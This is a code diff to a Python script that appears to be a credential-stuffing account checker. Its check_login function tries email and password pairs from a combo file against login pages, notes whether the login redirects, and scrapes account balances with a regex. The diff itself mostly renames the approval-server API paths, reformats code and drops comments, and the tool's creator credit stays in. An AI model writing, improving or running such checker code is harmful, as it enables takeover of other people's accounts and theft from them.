@@ -72,7 +72,6 @@ def check_login(url, email, password):
                 res['active'] = True; res['info'] = "Redirected"
             else:
                 res['active'] = False; res['info'] = "Still on login"
-        # Balance extraction (simple regex)
         bal_match = re.search(r'(?:balance|credit)[\s:$]*(\d+\.?\d{0,2})', r2.text, re.I)
         if bal_match: res['balance'] = bal_match.group(1)
     except requests.exceptions.Timeout:
@@ -129,20 +128,24 @@ def generate_token(name):
 def send_request(name):
     token = generate_token(name)
     try:
-        r = requests.post(f"{OWNER_SERVER}/request", json={"name":name, "token":token}, timeout=8)
-        if r.status_code==201:
+        r = requests.post(f"{OWNER_SERVER}/api/request", json={"name": name, "token": token}, timeout=8)
+        if r.status_code == 201:
             return token
-    except: pass
+    except:
+        pass
     return token
 
 def poll_approval(token):
     try:
-        r = requests.get(f"{OWNER_SERVER}/status/{token}", timeout=5)
-        if r.status_code==200:
+        r = requests.get(f"{OWNER_SERVER}/api/status/{token}", timeout=5)
+        if r.status_code == 200:
             data = r.json()
-            if data['status']=='approved': return True
-            elif data['status']=='declined': return False
-    except: pass
+            if data['status'] == 'approved': return True
+            elif data['status'] == 'declined': return False
+        elif r.status_code == 404:
+            return None
+    except:
+        pass
     return None
 
 # ---------- MAIN ----------
@@ -184,7 +187,6 @@ def main():
 
     # Package check (silent)
     spin("Checking packages...", 1.5)
-    # (dependencies already installed by auto‑install at top)
 
     # Main loop
     combo_file = None
@@ -212,11 +214,8 @@ def main():
             else:
                 print(f"  {W}{line}{RES}")
 
-        # Creator credit (RGB cycle)
         t = int(time.time()) % 10 // 5
         creator_color = COLOR_LOOP[t]
-        credit = f"{DIM}Created by Saeka Tojirp.{RES}"
-        # Replace first word color
         print(f"\n  {creator_color}Created{RES} by Saeka Tojirp.", end='')
 
         try:
